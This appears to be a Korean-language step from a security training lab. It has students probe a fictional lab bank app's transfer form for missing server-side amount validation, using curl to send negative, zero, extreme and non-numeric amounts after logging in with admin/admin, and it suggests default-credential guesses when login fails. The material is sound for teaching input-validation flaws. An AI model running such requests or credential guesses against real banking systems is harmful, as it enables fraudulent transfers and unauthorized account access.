  - order: 3
    instruction: |
      ## 🎯 MISSION — 가격 / 금액 검증 부재 시뮬 (음수 송금 시도)

      *송금 form* 의 *금액 field* 의 *서버 측 검증* 부재 시뮬. *음수 금액* / *0
      금액* / *극단 금액* 시도.

      ## 📚 사전 학습 (학생 혼돈 방지)

      - **input validation 의 7 표준**:
        - type (string vs int vs float)
        - range (min/max)
        - format (regex)
        - length
        - whitelist
        - encoding (UTF-8)
        - business logic (음수 X, 잔액 이상 X)
      - **client-side validation 만 의 위험** = HTML5 의 `<input type="number" min="1">`
        는 *우회 가능* (curl 의 *임의 값*)

      ## 💻 실행 명령

      ```bash
      ssh 6v6-attacker bash <<'SH'
      # session 의 login
      curl -sc /tmp/neobank-cookies.txt -X POST -H 'Host: neobank.6v6.lab' \
        -d 'username=admin&password=admin' http://10.20.30.1/login >/dev/null 2>&1

      # 5 금액 의 송금 시도
      for amount in -1000 0 0.001 999999999 "abc"; do
        echo "=== amount: $amount ==="
        code=$(curl -sb /tmp/neobank-cookies.txt -o /dev/null -w '%{http_code}' \
          -X POST -H 'Host: neobank.6v6.lab' \
          -d "to_account=12345&amount=$amount" \
          http://10.20.30.1/transfer)
        echo "code: $code"
      done
      SH
      ```

      ## 📋 확인 사항

      - 5 금액 의 응답 코드
      - *-1000* (음수) 의 *200 가능성* (vuln)
      - *0* 의 *200 가능성* (가능 X — 의미 없음)
      - *"abc"* (string) 의 *type error* 응답

      ## 💡 왜 이걸 하는가?

      *비즈니스 로직* 의 *서버 검증* 가 *security 의 마지막 boundary*. client-side
      만 의 검증 = *우회 default*.

      ## 🔍 결과 해석

      - **모두 400 (정상)**: input validation 표준 — type + range 검증
      - **음수 200 (vuln)**: A04 결함 — 음수 송금 시 *상대 계좌 에서 빼앗기*
      - **string 500 (vuln)**: type 검증 부재 — exception 노출

      ## 비정상 시 대응

      - **login 응답 다름**: NeoBank 의 default credential 시도 (test/test, user/user)
